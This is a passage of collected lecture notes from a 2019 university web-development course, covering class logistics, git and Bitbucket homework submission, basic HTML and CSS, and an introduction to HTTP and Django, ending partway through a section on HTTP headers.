

Lecture 1: Module0/Jan_07/notes.md
================================================================

# CS2610 - Mon Jan 07 - Module 0


# Announcements

## DC435 Cybersecurity Meetup group

https://dc435.org



## Free Software and Linux Club meetings

This semester the FSLC will be meeting on Wednesdays in ESLC 053 @ 7PM.

Our first meeting is this Wednesday night.  The club is a good place to gain
skills and experiences that you are not likely to find in the classroom.
Together we'll learn and do things of *practical* importance that will make a
big difference to your resume. 


## Cybersecurity club w/Management and Information Systems Dept.

This club will be meeting on Wednesdays in ESLC 053 @ 6PM.


# Topics:

* What can I expect from this class?
* "Get to know you" mud card activity


----------------------------------------------------------------------------
# What can I expect from this class?

The purpose of this course is to prepare you to become a competent
problem-solver who understand and uses the best Software Engineering
techniques.


## Class Rules

To complete your enrollment in this course you will need to read and understand
the Syllabus and Class Rules.  There will be a quiz.  The quiz doesn't count
against your grade and you may take it as many times as you need.  You will be
unable to proceed in the course until you complete the quiz with a 100% score,
and failure to complete the quiz before the due-date will result in your being
dropped from the class.

The Syllabus is found on Canvas, and the class rules are on Bitbucket.

* [Lecture Notes on Bitbucket](https://bitbucket.org/erikfalor/sp19-cs2610-lecturenotes/src/master/)
* [Ten Thousand](https://xkcd.com/1053/)
* [The Three Virtues](http://threevirtues.com/)



### Open-door policy

You are not only welcome to drop in to my office, but you are encouraged to do
so.  My office is on the 4th floor of Old Main, room 421.  My dedicated office
hours are posted in the Syllabus, but you are welcome to drop by anytime I'm
in.


### Teaching Assistants

* Manish Meshram
* Thomas O'Reilly

You will find their contact information and office hours in the Syllabus


### Tutor Room Hours

The tutor room is right across from my office.  You are able to take your
questions there and work on your programs.

Old Main 4th floor, room 419

Mon - Fri: 10AM to 9PM
Sat: 11AM to 9PM



## [Course Topic Outline](../course_topic_outline.md)

Unlike other web-development courses offered at USU, this course is not focused
on making pretty webpages.  Instead, you will learn both sides of the process
to create dynamic, database-driven, web applications using the most basic,
fundamental technologies wherever possible.


----------------------------------------------------------------------------
# "Get to know you" mud card activity


I'll often ask you to turn in a "mud card" at the end of class.  The name comes
from "muddiest point".  You will reflect upon what was discussed in a lecture
and write a brief note explaining what you did not understand or a new question
raised by what you learned.

This serves the following purposes:

1. Provides a quick head-count of who attendend today
2. Putting into writing what you learned in a day increases recall
3. Lets me know which topics were well recieved, and which need another approach
4. Gives another opportunity for you to ask a question in a non-intimidating way



Please write the following information on a piece of paper and return it to the
instructor or a TA:

1. Your name and A#
2. What is your class and major?
3. Why are you enrolled in this course?
4. What is your favorite game?
5. What type of music do you like the most?
6. What do you like to do for fun?
7. Names of at least 3 of your neighbors and something unique or interesting about them
8. Who are your study buddies in this class?


Lecture 2: Module0/Jan_09/notes.md
================================================================

# CS2610 - Wed Jan 09 - Module 0

# Announcements


## FSLC Meeting Postponed

The first meeting will be next Wednesday, Jan 16



## Upcoming events

### Silicon Slopes Summit

Jan 31 - Feb 1

A technology and entrepreneurship summit held in Salt Lake City. There are
going to be major speakers, networking opportunities, and a Sundance Movie
Screening. Students can register at https://www.siliconslopessummit.com/ and
use the code SSTS19USUCC at checkout for a free pass. 



### STEM Fair - Career fair for Stem Majors

Wednesday Feb 13 3:00-7:00, TSC Ballroom. 



### Engineering Council

Engineering Council is the student government for the College of Engineering.
We meet every Thursday in room 325 (The room right next to the tutoring center)
at 5 PM. We are especially looking to recruit more CS majors.



### Python Utah North Meetup

Data Pipelines with Airflow - Matthew Housley
Wednesday, January 16, 2019

https://www.google.com/maps/search/?api=1&query=41.687650%2C-111.864990

Details at https://www.meetup.com/Python-Utah-North/events/256899519/


# Topics:

* Installing Anaconda and Git
* What is Git?
* How do I use Git to submit my homework?


----------------------------------------------------------------------------
# Installing Anaconda

See this module's [assigned reading](https://bitbucket.org/erikfalor/sp19-cs2610-lecturenotes/src/master/Readings_and_resources.md)



----------------------------------------------------------------------------
# What is Git?

Git is a version control system (VCS).  Think of it as the ultimate "undo"
button for an entire project.  Presently you would keep All of the files
comprising your project in a directory on your computer.  Git adds a hidden
database into that directory making it a repository.  With that database git is
able to  remember all changes you've made to any files within the repository,
no matter which program you've used to change them.

#### repository = a directory which has been initialized for use with git

#### commit = a record of changes to one or more files

Instead of manually keeping track of lots of backup directories for your code,
git will remember what you were doing at every step of the way, and gives you
the ability to see what your current files were like in the past, conveniently
undo a mistake, coordinate your work with many other programmers, and keep your
project in sync across many computers.


### Is Git the same thing as GitHub?

Git is not made by GitHub; Github just made a hub.

There are several "hubs" Git users may use to share their code online; GitHub
is just the most popular right now.  I'll teach you how to use another Git
repository hosting service called Bitbucket.


----------------------------------------------------------------------------
# How do I use Git to submit my homework?

To complete Assignment #0 you must master the 8 commands listed in the assigned
reading on Bitbucket.  These commands are:

1.  git status
2.  git init
3.  git add
4.  git config
5.  git commit
6.  git remote
7.  git push
8.  git log


On your computer
================

### First, you must create a "repository" somewhere on your computer.

Remeber that a repository (or a repo) is just a directory containing a special
database which is used by Git.

Before you create a repo you should make sure that you don't already have a
repo here.  You definitely *do not* want to create a git repository within a
git repository.  I call this situation *Gitception*, and like the movie
*Inception* it is very confusing to experience.

You can detect the presence of a repo in this folder by running the `git status`
command.  In this case you want to see an error message because the error alerts
us to the *absence* of a repo.


```
$ git status

fatal: not a git repository (or any parent up to mount point /)
Stopping at filesystem boundary (GIT_DISCOVERY_ACROSS_FILESYSTEM not set)
```

Before creating a new repository always run `git status` before running `git
init` to find out if you are already within a git repository.  You want to see
`git status` present an error message in this situation as it will confirm that
you are *not* already inside a git repository.


### Make a new git repository called cs2610-falor-erik-assn0

Be smart and substitute your name for mine.

```
$ git init cs2610-falor-erik-assn0
```


### Move into the repository's directory

Generally speaking, the effects of a command run in the shell is isolated to
the directory the shell is currently open to.  Use the `cd` or *change
directory* command to open a new directory so that commands will operate in the
new location.

```
$ cd cs2610-falor-erik-assn0
```

To conform to the assignment submission guidelines you will create a new
directory called 'src' and put your code there.

```
$ mkdir src
$ cd src
```


### Create a file

Use your text editor to create a new file in this directory.  You might call it
"README.md" and say something nice to your grader (hey, you never know).  I'll
call mine "index.html" and write a webpage that will help us
remember the steps to using git.



### Query git for the status of your little repository

Save index.html and see what git has to say about it's presence in the repository

```
$ git status
```


### Tell git to start keeping track of index.html

```
$ git add index.html
```


Get the status of your repository again; it should tell you that you have
changes ready to be committed

```
$ git status
```


### Tell git who you are

Git wants to know your name and email address so that when you make commits it
can record who was responsible.


```
$ git config --global user.name   "Danny Boy"
$ git config --global user.email  "danny.boy@houseofpain.com"
```


### It is time to go through with it

Tell git to permanently record your work.  In addition to the state of tracked
files within the repository, this permanent record contains the date, name of
the author, and a short message describing the change.

I recommend that you supply a helpful message about what you were doing and why
because that information will be valuable later on.

For beginners it is best to supply a brief message directly on the command line
with the *-m* option and double quote marks, like so:

```
$ git commit -m "This is a thoughtful message about this code commit"
```

If you forget the -m option you may find yourself in an arcane program which is
difficult to leave.  When this happens to you, press <Esc> followed by ZZ (that
is, capital "Z" twice).


Now that you've committed your changes get the status of your repository once
more.

```
$ git status
```


Make a few more changes to this file, saving, adding, and committing each time.
Try hard to give each commit a meaningful message that later on will help you
remember what you were doing at the time.  Now you have created a timeline of
changes to the repository which you can view with the `git log` command.

```
$ git log
```



On Bitbucket
============

Now you're ready to put your code on the web.  Log in to your Bitbucket account
and create an empty repository there.  You will send the code from your
computer to this empty location on Bitbucket.

1. Log into Bitbucket
2. Click on the + button in the left sidebar
3. Click on "Repository"
4. Give your repository a name; cs2610-falor-erik-assn0 seems appropriate here
5. Make sure that you've designated it to be *private*
6. **Do not** include a README file
6. Click "Create Repository"
7. The resulting page will bear the text "Let's put some bits in your bucket"
8. Click the gear icon in the left sidebar to enter the settings for your
   repository.  Click "User and group access".  Enter the Bitbucket usernames
   for the instructor and TAs as found in the Syllabus (erikfalor, manish-usu,
   thomasoreilly).  We only need *read* access to your repository.
9. Click the blue "</>" icon on the left sidebar to return to the  "Let's put
   some bits in your bucket" page.  Scroll down to the section titled "Get your
   local Git repository on Bitbucket".  Copy the commands listed under "Step
   2".  They should look like this, but with your name instead of mine:

```
$ git remote add origin git@bitbucket.org:erikfalor/cs2610-falor-erik-assn0.git
$ git push -u origin master
```


Back on your computer
=====================

Next, use the git program in Anaconda to "push" Assignment 0 to Bitbucket
where the graders can find it.

1. Return to your console

2. Paste the commands Bitbucket provided on the command line.
   You may be prompted for your Bitbucket password.  You will not see anything
   as you type it in; this is to defeat shoulder-surfers from learning your
   credentials.  Enter your password and press enter.  If you spelled your
   password correctly git will display something like the following:

```
Counting objects: 4, done.
Delta compression using up to 8 threads.
Compressing objects: 100% (4/4), done.
Writing objects: 100% (4/4), 2.48 KiB | 2.48 MiB/s, done.
Total 4 (delta 0), reused 0 (delta 0)
To https://erikfalor@bitbucket.org/erikfalor/cs2610-falor-erik-assn0.git
 * [new branch]      master -> master
Branch master set up to track remote branch master from origin.
```

3. Return to the Bitbucket webpage and refresh it - it will no longer tell
   you how to put more bits in your bucket.

4. Finally, submit the repository's URL to Canvas.



Lecture 3: Module1/Jan_11/notes.md
================================================================

# CS2610 - Fri Jan 11 - Module 1


## Intro Video
 
[1993: CNN's first reports on the Web](https://youtu.be/4aIkMwUeL_Q)


# Announcements

Complete the Class Rules & Syllabus quiz by midnight Jan 13 or you will be
dropped from the class.



# Topics:
* What is a markup language?
* Basic HTML5 Elements


----------------------------------------------------------------------------
# What is a markup language?

https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/Getting_started

A markup language gives a way to describe the appearance of a document only
using plain text.


Historically, markup languages have been used to encode visual information
about a document ina medium which did not support directly storing that
appearance.

More recently, new markup elements have been added to HTML to encode structural
or other meaningful information about a document.  Search for "semantic web" if
you want to learn more about that.



#### Element: Markers which enclose or "wrap" other pieces of plain text

    <p>This is an element, complete with tags which wrap plain text</p>


#### Tag: Text which denotes the type and extent of an element

    <h1>, <p>, <b>, <strong>, <img> are examples of tags


#### Content: Text or more HTML elements contained within another element

`p` elements contain content.  The content is surrounded by an opening `<p>`
tag, and a closing `</p>` tag.  `p` elements may contain other HTML elements
and text.
    
`img` elements do not contain content.  Therefore, there is no `</img>` closing
tag.


#### Attribute: Extra information about an element which is not part of its content

Attributes in HTML look like this:

    href="https://duckduckgo.com"
    style="1px solid black"
    class="document-title"

Attributes belong *inside* of a tag, and give more information about the
meaning and appearance of a tag.

The `img` element is completely configured by its attributes.

For example:

*   The `src` attribute specifies the location of an image
*   The `alt` attribute defines an alternative text description of the image
    that is used by screen readers or in the event that an image cannot be
    downloaded
*   The `title` attribute is where you can specify the text that appears when
    you hover your mouse over the image


Learning to write HTML is largely an exercise in learning what elements exist,
how they are composed, and which attributes affect them.


----------------------------------------------------------------------------
# Basic HTML5 Elements

You must use each of these elements on [Assignment 1: Static Blog on BitBucket
(Web 1.0)](https://usu.instructure.com/courses/529849/assignments/2581299)

Their form and function are documented on the Mozilla Developer Network's [HTML
elements reference](https://developer.mozilla.org/en-US/docs/Web/HTML/Element).
You will be expected to read and understand this documentation as part of this
assignment.

I welcome you to play with [index.html](index.html) on your own to experiment
with using these tags, as well as the browser's developer tools.

*   h1
*   h2
*   p
*   pre
*   code
*   a
*   img
*   ol
*   ul
*   li


Lecture 4: Module1/Jan_14/notes.md
================================================================

# CS2610 - Mon Jan 14 - Module 1

# Announcements


## Free Software and Linux Club Spring Opening Social

Come hang out with people who share an interest in Linux

There will be pizza!

Wednesday Jan 16, 7pm @ ESLC 053



# Topics:

*   Introducing Assignment 1
*   Validating HTML on the W3C site
*   HTML Tables
*   Valid HTML5 Document Outline


----------------------------------------------------------------------------
# Introducing Assignment 1

I've been helping many students get their Git repos ready for Assignment 0 (due
on Wednesday).  This is great!

Let's take a look forward at what is required for the following assingment

[Assignment 1](https://usu.instructure.com/courses/529849/assignments/2581299)


----------------------------------------------------------------------------
# Validating HTML on the W3C site

Since the browser is not very helpful when it comes to detecting HTML errors,
we must turn to another tool for this insight.

Look ahead to your next assingment

    https://usu.instructure.com/courses/529849/assignments/2581299

One of the requirements is that your webpage(s) correctly follow the HTML5
standard.  As explained above, your web browser is very forgiving and will not
alert you to your mistakes.

The W3C's Markup Validation Service will help you find trouble spots.
https://validator.w3.org/nu/#file


----------------------------------------------------------------------------
# HTML Tables

Last Friday we created a simple [HTML document](index.html) to illustrate basic
HTML elements.  Let's revisit that document to discover more about the
appearance and layout of HTML elements.


*   [table](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/table)
*   [thead](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/thead)
*   [tr](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/tr)
*   [td](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/td)


----------------------------------------------------------------------------
# Valid HTML5 Document Outline

What form must a complete and correct HTML5 document have?


Compare the contents of the file `index.html` with the document shown in the
Inspector.  The following elements are present in the Inspector despite not
existing within the file:

*   html
*   head
*   title
*   body

While the contents of each webpage may be unique, there is a basic structure
which they must all follow in order to be correct.  

    <!DOCTYPE html>
    <html>
        <head> </head>
        <body> </body>
    </html>


Your browser will silently fix any problems it comes across so that users have
a pleasant experience.  This is frustrating for developers because it means
that many errors are hidden from us by the "helpful" browser.



## Questions to consider
* What sort of content belongs within the `head` element?

* What sort of content belongs within the `body` element?

* How many `html` elements may your document contain?

* Does it matter where the <!DOCTYPE> directive appears?




Lecture 5: Module1/Jan_16/notes.md
================================================================

# CS2610 - Wed Jan 16 - Module 1

# Announcements

## Free Software and Linux Club Spring Opening Social Tonight

Come hang out with people who share an interest in Linux

There will be pizza!

Tonight, 7pm @ ESLC 053





# Topics:

* Block-level vs. inline elements
* Hyperlinks
* URLs


----------------------------------------------------------------------------
# Block-level vs. inline elements

https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/Getting_started#Block_versus_inline_elements


Most HTML elements can be placed into one of two major categories related to
how they share space with their neighbors.


#### Block-level elements
Separated vertically from adjacent elements in the source code.  These take up
the entire width of their container.

Examples of block-level elements:
    p, div, h1, h2



#### Inline elements
Not separated vertically; adjacent inline elements are strung together side-by-side.

Examples of inline elements:
    em, strong, a, img, span


You are able to visualize this by opening the Inspector and hovering the mouse
over elements in the document tree.




## Everything else:
There are a few HTML elements which do not fit into either of these categories.
Some elements are not visually represented in the body of the document; these
include tags that belong in the `head` of the document:

*   `title`
*   `meta`
*   `link`
*   `style`

There are a few non-visible tags that may also go in the body of the document.
The most common that you will encounter is

*   `script`

Of the visible tags, `table` is notable because it is in a class of its own and
is neither inline nor block-level.  It's behavior is most similar to block-level.





----------------------------------------------------------------------------
# Hyperlinks

Q: What does HTML stand for?

A: HyperText Markup Language


Q: What does the H mean?

A: Hyper; as in "hyperconnected".


HTML documents may contain links to other HTML documents.  These links are encoded as <a> elements.



## The [anchor](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a) element

`a` is for "anchor".  The content of the `a` tag is what the user will click
on.  *Where* the hyperlink takes you is encoded in the `href` attribute.

Hyperlinks <a href="https://amazon.com">Spend all of your $$$ here!</a>

For an `a` element to become active, it must have the `href` attribute.


##  The <a> element is what makes HTML "hyper"

Different cultures may disagree over which side of the book is the "front",
but we can all agree that a book has a beginning and an end with one page
following another page.  

HTML allows an arbitrary number of pages to follow from one page.
There may or may not be a "first" page of a website.
Likewise, there may or may not be a "last" page.

If there is such a thing as a "first" page, it would be index.html (or some
variation on that name: index.php, index.aspx, etc.).  This is simply a
convention that web browsers and web servers follow: If you visit a webpage and
don't specify which exact page you want to see, you'll be given a default page
with a name chosen from the list above.



## Questions to consider:
* Can HTML do everything which can be done with an ordinary, bound book?
* Can you replicate the "hyper"-ness of the web in traditional media? 


------------------------------------------------------------
# URLs

#### Uniform Resource Locator: a unique name for an object on a computer network.

## Also related: URI
#### Uniform Resource Identifier: a unique name for an object on a computer network.

https://developer.mozilla.org/en-US/docs/Learn/Common_questions/What_is_a_URL


## URL Syntax
https://en.wikipedia.org/wiki/URL#Syntax

    scheme:[//[userinfo@]host[:port]]path[?query][#fragment]


## Absolute vs Relative URLs

#### Absolute URLs

These include the domain name, and only work when that domain name hosts the
specified resource (webpage, image, stylesheet, etc.).

Pros:
* Specifies the main website - 1st point of contact

Cons:
* If the website moves to a new domian, these must be updated


#### Relative URLs

These do *NOT* include the domain name; the browser prefixes these with the current domain name from the address bar.

Pros:
* Shorter = less typing ;)
* Less work when moving website to another location

Cons:
* Cannot be used to refer to an outside website


We can use URLs to join webpages together.  Let's try this now.

index.html <--> aboutMe.html



Lecture 6: Module1/Jan_18/notes.md
================================================================

# CS2610 - Fri Jan 18 - Module 1

# Announcements


## Cyber Security Club

The opening meeting will occur next Wednesday, January 23rd @ 6pm - ESLC 053 



## FSLC InstallFest

Do you want to rock Linux on your own computer, but don't know how to start?
Get experienced help installing it!

* Try a new distribution
* Reinstall Linux
* Dual-, Triple-, or Quadruple-boot
* Repair a broken installation

Bring a laptop and a flash drive, or install on one of our machines




# Topics:
*   Cascading Style Sheets
*   Selectors: Finding our way around the DOM
*   Properties & Rules


----------------------------------------------------------------------------
# Cascading Style Sheets


## What's wrong with writing a webpage like it's 1996?

I've just implied that there is something wrong with SpaceJam.com.

*   Is there anything wrong with using HTML tags to style a webpage?
*   If you don't already know the answer to this question, what do you think a
    better approach would be like?
*   If you do know the answer, explain in your own words why it is superior.



[What is CSS trying to solve?](../Readings-and-resources.md#markdown-header-what-is-the-big-problem-cascading-style-sheets-aim-to-solve)

[CSS Syntax](https://developer.mozilla.org/en-US/docs/Learn/CSS/Introduction_to_CSS/Syntax)


Instead of crafting a document using special tags you can instead use otherwise
invisible elements such as DIV and SPAN to define the structure of the
document, then define an appearance for those SPANs and DIVs in CSS.

The advantage of the CSS approach is that you can make one change in one
location and effect the entire website.  If you used combinations of visual
tags such as H1, STRONG, EM to decorate your document, you'd need to rewrite
lots of CSS and restructure your document to change how it looks.


----------------------------------------------------------------------------
# Selectors: Finding our way around the DOM

In order for CSS to be useful we need a langnuage which lets us explain to the
browser how to locate our desired elements in the document.


#### Document Object Model: a way to represent and interact with an HTML document

https://developer.mozilla.org/en-US/docs/Glossary/DOM

An HTML document can be thought of as a tree data structure (like a binary or
N-ary tree, or a directed acyclic graph if you've taken CS2410).  The DOM is
the set of functions and data structures which we can use to query and modify
the HTML document like a tree data structure.



## How can I use the structure of the document to my advantage?

CSS uses the notion of *selectors* to let us describe locations in the tree.



### Simple selectors

https://developer.mozilla.org/en-US/docs/Learn/CSS/Introduction_to_CSS/Simple_selectors

There are three simple CSS selectors

*   Element or Type selectors: simply name an HTML element
*   ID selectors: matches a unique element named by the value of the id=""
    attribute; begins with the '#' symbol
*   Class selectors: matches one or more elements which contain a name in the
    class="" attribute; begins with the '.' symbol



### How may I combine selectors?

Stay DRY and Don't repeat yourself - use the same CSS rules for many selectors!

https://developer.mozilla.org/en-US/docs/Learn/CSS/Introduction_to_CSS/Combinators_and_multiple_selectors


These composite selectors enable you to refer to elements by their relationship
to other elements.  For example, you can select P elements that are children of
a DIV, or LI elements with an ordered list but *not* those within an unordered
list, etc.


----------------------------------------------------------------------------
# Properties & Rules


Styling elements may be done with:

#### Tags which give an element an appearance (em, i, b, strong)

*   *pros:* easy and backwards-compatible with the 1990's (this is how
    http://spacejam.com was originally authored)
*   *cons:* you must change the very structure of the document to make it look
    different; you must visit every node in every document which needs to be
    updated


#### The style="" global attribute
*   *pros:* we can use the CSS "property: value" syntax that we'll soon become familiar with
*   *cons:* again, we must visit every node to apply style


#### CSS
*   *pros:* your style information is all in one place; conveniently apply the
    style to large chunks of the document in one fell swoop
*   *cons:* added complexity of a new language



## CSS Ruleset Syntax

https://developer.mozilla.org/en-US/docs/Learn/CSS/Introduction_to_CSS/Syntax



### Properties and values

The "fun" part of learning CSS is learning all of the properties which affect
elements, and learning *how* to give the desired effect.  Each CSS property
takes on a value.  Each property has its own set of allowed values.  Most
browsers will ignore a property which is given an invalid value.



#### Assignment #1 Required CSS properties

These are the CSS properties which *must* be used on Assignment #1.  You are,
of course, welcome to use any other properties you like.

*Note:* this list has been changed slightly to make it easier for you to
complete the assignment.

* [background-color](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color)
* [color](https://developer.mozilla.org/en-US/docs/Web/CSS/color)
* [font-family](https://developer.mozilla.org/en-US/docs/Web/CSS/font-family)
* [font-style](https://developer.mozilla.org/en-US/docs/Web/CSS/font-style)
* [text-align](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align)
* [border](https://developer.mozilla.org/en-US/docs/Web/CSS/border)
* [margin](https://developer.mozilla.org/en-US/docs/Web/CSS/margin)
* [padding](https://developer.mozilla.org/en-US/docs/Web/CSS/padding)



### The box model

[Box Model](https://developer.mozilla.org/en-US/docs/Learn/CSS/Introduction_to_CSS/Box_model)

The last three properties in the list above control how elements are arranged
on the screen.  Conceptually, each visual element is contained within a
rectangular box.

The size of the box depends upon the size of its contents, the thickness of the
*padding* between these contents and the thickness of the *border* surrounding
the box.  This border is always present, but may or may not be visible.  There
may be empty space just outside of the borders of boxes called the *margin*.



### What happens when many CSS rules apply to the same element?

https://developer.mozilla.org/en-US/docs/Learn/CSS/Introduction_to_CSS/Cascade_and_inheritance

The cascade algorithm applies rules in order according to this hierarchy:

1.  **Importance**
2.  **Specificity**
3.  **Source order in the CSS file**


Importance is denoted with the `!important` token beside a rule


Specificity refers to how specific the selector is with regard to an element.
From least specific to most specific:

    Element selector < Class selector < ID selector


Source order means that the last rule seen by the browser wins.  When one
element belongs to two classes, the last class in the final CSS file wins.


Lecture 7: Module1/Jan_23/notes.md
================================================================

# CS2610 - Wed Jan 23 - Module 1

# Announcements

## Cyber Security Club

The opening meeting will occur tonight @ 6pm - ESLC 053



## FSLC InstallFest

Tonight @ 7pm - ESLC 053

Do you want to rock Linux on your own computer, but don't know how to start?
Get experienced help installing it!

Bring a laptop and a flash drive, or install on one of our machines




# Topics:

*   Bootstrap CSS
*   How CSS is applied to the document
*   Validating CSS
*   Misc. Subjects that came up over the course of the lecture



--------------------------------------------------------------------------------
# Misc. Subjects that came up over the course of the lecture

## HTML Entities

In Java and Python you'd write "\n" to represent a newline, or "\t" to
represent a tab character.  These sequences of two characters to represent
another character are called "escape sequences".

Entities are HTML's version of escape sequences.

Some entities which you may have seen before include:

*   &gt;  for greater-than sign >
*   &lt;  for less-than sign <
*   &times; for a multiplication symbol
*   &nbsp; non-breaking space, a space character which a `p` won't eat.


https://developer.mozilla.org/en-US/docs/Glossary/Entity


## Flexbox for layout

I used to include Flexbox in the curriculum, but have dropped it this semester
in favor of including other topics.  Flexbox is a good alternative to using
HTML Tables for layout (honestly, *anything* is better than a Table when it
comes to laying things out - see the source code for https://spacejam.com if
you aren't convinced).

Flexbox is completely optional for this course, but if you want to try it I
recommend this guide:

https://css-tricks.com/snippets/css/a-guide-to-flexbox/




--------------------------------------------------------------------------------
# Bootstrap CSS

Presentation by TA Thomas O'Reilly

Bootstrap is basically a CSS library that you can drop into your project and
use immediately.  For purposes of Assignment 1 you must do *some* CSS manually,
but from here on out you're welcome to incorporate it into any of your
assignments.


Get the files for this presentation from
https://bitbucket.org/thomasoreilly/bootstrap-presentation.git



## Get Bootstrap

https://getbootstrap.com

The easiest thing to do is to include Bootstrap using a `link` tag using a
Content Delivery Network (CDN) URL.  The servers which make up a CDN are close
to you geographically, meaning that your users will download the content
quickly.  Also, because they are distributed around the world, if one server
goes down another is ready to take its place, meaning that your site is more
likely to look good no matter what the internet is doing.




--------------------------------------------------------------------------------
# How CSS is applied to the document

## <style></style> vs. style=""
Style information can be applied to (nearly) any element by way of the style="" attribute.

CSS can be placed into a document's head by writing it in a style element.

This method is known as "internal" CSS



## Supplying an external stylesheet
An external CSS file can also be linkd from within a document's head.

In this case we use a link element with the attributes rel and href:

    <link rel="stylesheet" type="text/css" href="style.css"/>




### Internal CSS vs. External CSS

* External CSS can be used across HTML files to apply the same style everywhere
* It's easier to maintain styles when the HTML code and style information is stored separately
* Move everything with the style element and paste in a new file with .css extension
* Either way you include CSS, it belongs in the head of the document


--------------------------------------------------------------------------------
# Validating CSS on the W3C site

CSS files can be validated with a W3C tool just like HTML files.

https://jigsaw.w3.org/css-validator/#validate_by_upload





Lecture 8: Module2/Jan_25/notes.md
================================================================

# CS2610 - Fri Jan 25 - Module 2


# Announcements

## FSLC website is online!

https://usufslc.com/


## BSidesSLC 2019 Cyber Security Conference

https://www.bsidesslc.org

Build, Break, Network, Learn, & Give Back!   

Friday, February 22

10333 S Jordan Gateway, South Jordan, Utah, 84095

### BSidesSLC Student Scholarship Program
https://www.bsidesslc.org/scholarship

*Interested students must submit a proposal by Friday, February 1st, 2018*



# Topics
* How does a web server fit into the scheme of things?
* How does the HyperText Transfer Protocol (HTTP) work?
* Getting started with Django



----------------------------------------------------------------------------
## How does a web server fit into the scheme of things?


#### Mud Card Activity: Create a protocol

For the time being I want you to forget everything you may already know about HTTP.

Your team is tasked with devising a language for two computers to in order to
communicate with each other.  One of the computers will play the role of a
`server`, which lives to fulfill the wishes of its client.  The other computer
will be the `client` which will ask questions and make requests of its server.

To keep things simple, we will follow these assumptions:

* Each interaction will begin with the client's request.

* Each interaction will end with the server's response.

* The client never becomes a server, nor will the server ever take on the role
  of a client.

* If a problem arises with the request, the server will respond with an
  indication of an error, and this communication ends. The client may then
  begin again with a new communicaiton.

### Consider the following questions:

+ What sorts of vocabulary will your language need?
    + What are the nouns in your language?
    + What are the verbs in your language?

+ What concepts do you envision to be the most difficult to exchange
  information about?

+ What concepts will your language be best suited to facilitate communication?



----------------------------------------------------------------------------
## Servers and Protocols


#### HTTP: Hyper Text Transfer Protocol
Originally invented by Tim Berners-Lee at CERN in the early 90's to share
information between researchers.

Fits well with HTML, but you can use HTTP to send other kinds of data


#### Protocol:
A system of rules which define how data is exchanged between systems
Also defines the format of the data

What to say, and when you may say it


#### Server:
Exists to provide services to other users/systems
This is the backend

#### Client (a.k.a. User Agent):
Makes requests of servers to provide functionality to their users
This is the frontend





----------------------------------------------------------------------------
## How does the HyperText Transfer Protocol (HTTP) work?

https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview

As far as protocols go, HTTP is very simple.

It isn't comprehensive, and leaves lots of details to the other protocols it
"rides on top of".

It therefore doesn't need to specify much in the way of addressing, hostname
to address resolution, connection negotiation and maintenance, as these
details are handled by lower-level protocols such as ICMP, IP, DNS and TCP.

HTTP consists of human-readable plain text as opposed to being expressed as
binary - a feature it enjoys by being situated at the top of the protocol
hierarchy.

HTTP is extensible through it's acceptance of a wide variety of headers.  The
protocol works when user-agents (browsers, mostly) and servers agree upon what
a particular header means. But when an unrecognized header is presented to a
user-agent, it ignores it instead of responding with an error condition. This
makes it easy to augment the standard by adding new features to the protocol
later on.


                                                            
### HTTP Semantics
A client initiates a communication in HTTP.  It sends a request to a server.
The server responds, concluding the communicaiton.

* HTTP request messages begin with a block of headers in the form of

    METHOD PATH VERSION
    Header0: value0
    Header1: value1
    ...
    <blank line>
    Content data follows...


* HTTP responses look like this:

    VERSION STATUS_CODE STATUS_MESSAGE
    Header0: value0
    Header1: value1
    ...
    <blank line>
    Content data follows...





### HTTP Methods

https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods

These are the verbs in the HTTP language.  These are the actions that HTTP
clients can perform with an HTTP server.  This table is not exhaustive


| Method | Description                                                                                              |
|--------|----------------------------------------------------------------------------------------------------------|
| GET    | Requests a representation of the specified resource. Requests using GET should only retrieve data        |
| POST   | Submit an entity to the specified resource, often causing a change in state or side effects on the server|
| PUT    | Replaces all current representations of the target resource with the request payload                     |
| DELETE | Removes the specified resource                                                                           |
| HEAD   | Asks for a response identical to that of a GET request, but without the response body                    |
| OPTIONS| Asks the server what communication options it supports                                                   |



### HTTP Response Status Codes

The server's response begins with a three-digit number indicating the
disposition of the client's request.  You've undoubtedly encountered a webpage
bearing the message `404 Not Found`.

Responses are grouped into five broad categories whose status codes share the
same first digit.  Responses always bear a human-friendly translation of the
status code.

| Category      |Digit| Examples                                                                      |
|---------------|-----|-------------------------------------------------------------------------------|
| Informational | 1xx | `100 Continue`, `101 Switching Protocol`                                      |
| Success       | 2xx | `200 OK`, `201 Created`, `204 No Content`                                     |
| Redirection   | 3xx | `301 Moved Permanently`, `307 Temporary Redirect`                             |
| Client errors | 4xx | `400 Bad Request`, `401 Unauthorized`, `403 Forbidden`, `418 I'm a teapot`    |
| Server errors | 5xx | `500 Internal Server Error`, `501 Not Implemented`, `503 Service Unavailable` |



----------------------------------------------------------------------------
## Getting started with Django

To take our next step towards making dynamic, database-driven web applications
we will need to use a server.  Furthermore, we will need to somehow provide
programs to the server so that users can interact with it dynamically.

In this course we will be using [Django](Readings-and-resources.md) to fill
this need.


Lecture 9: Module2/Jan_28/notes.md
================================================================

# CS2610 - Mon Jan 28 - Module 2

# Announcements

## The USU Security Team is Hiring

They are looking for Security Minded Students
You can apply on [Aggie Handshake](https://app.joinhandshake.com/jobs/2331049)




# Topics:
* HTTP Headers
* Static hosting on Bitbucket
* Getting started with Django
* Python intro
* Writing your first Django view


----------------------------------------------------------------------------
# HTTP Headers

[HTTP Header Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)

HTTP headers allow the client and the server to pass additional information
with the request or the response.

A request header consists of its case-insensitive name followed by a colon ':',
then by its value (without line breaks).

Leading white space before the value is ignored.


There are two categories of headers:

1.  **Request** headers are sent client -> server
2.  **Response** headers are sent server -> client

General headers may be sent in both directions.

Here are some important headers that let the client and server negotiate the
terms of communication.


Cache-Control
-------------
The `Cache-Control` general header field is used to specify directives for
caching mechanisms in both requests and responses.  `max-age` is expressed
in seconds.

	Cache-Control: no-cache
	Cache-Control: max-age=600


Connection
----------
The `Connection` general header controls whether or not the network connection
stays open after the current transaction finishes.

	Connection: keep-alive
	Connection: close


Accept
